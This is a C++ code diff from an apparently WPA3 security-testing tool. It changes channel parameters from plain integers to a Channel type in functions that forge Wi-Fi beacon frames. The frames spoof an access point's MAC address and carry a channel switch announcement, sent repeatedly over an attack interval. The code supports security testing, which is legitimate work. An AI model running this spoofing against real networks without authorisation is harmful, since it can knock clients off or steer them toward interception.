@@ -7,28 +7,29 @@
 using namespace std;
 using namespace Tins;
 using namespace chrono;
+using namespace wpa3_tester;
 
 void send_CSA_beacon(const HWAddress<6> &ap_mac,
                      const NetworkInterface &iface,
                      const string &ssid,
-                     const int ap_channel,
-                     const int new_channel
+                     const Channel ap_channel,
+                     const Channel new_channel
 ){
     Dot11Beacon beacon;
     beacon.addr1(Dot11::BROADCAST);
     beacon.addr2(ap_mac);
     beacon.addr3(ap_mac);
     beacon.ssid(ssid);
-    beacon.ds_parameter_set(ap_channel);
+    beacon.ds_parameter_set(ap_channel.ch_num);
 
     Dot11ManagementFrame::channel_switch_type cs;
     cs.switch_mode = 1;
-    cs.new_channel = new_channel;
+    cs.new_channel = static_cast<uint8_t>(new_channel.ch_num);
     cs.switch_count = 3;
     beacon.channel_switch(cs);
 
     RadioTap radiotap;
-    const int freq_mhz = wpa3_tester::hw_capabilities::channel_to_freq(ap_channel);
+    const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
     radiotap.channel(freq_mhz, RadioTap::OFDM);
     radiotap.inner_pdu(beacon);
 
@@ -39,7 +40,7 @@ void send_CSA_beacon(const HWAddress<6> &ap_mac,
 void check_vulnerable(
     const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
     const string &iface_name, const string &ssid,
-    const int ap_channel, const int new_channel,
+    const Channel ap_channel, const Channel new_channel,
     const int ms_interval, const int attack_time
 ){
     const NetworkInterface iface(iface_name);
@@ -55,7 +56,7 @@ void check_vulnerable(
             << "AP MAC: " << ap_mac << "\n"
             << "STA MAC: " << sta_mac << "\n"
             << "Interface: " << iface_name << "\n"
-            << "Channel: " << ap_channel << "\n"
+            << "Channel: " << ap_channel.ch_num << "\n"
             << "SSID: " << ssid << endl;
 }
 
@@ -72,8 +73,8 @@ int main(const int argc, char *argv[]){
     const HWAddress<6> sta_mac(argv[2]);
     const string iface_name = argv[3];
     const string ssid = argv[4];
-    const int ap_channel = stoi(argv[5]);
-    const int new_channel = stoi(argv[6]);
+    const Channel ap_channel{stoi(argv[5])};
+    const Channel new_channel{stoi(argv[6])};
     const int ms_interval = stoi(argv[7]);
     const int attack_time = stoi(argv[8]);
 
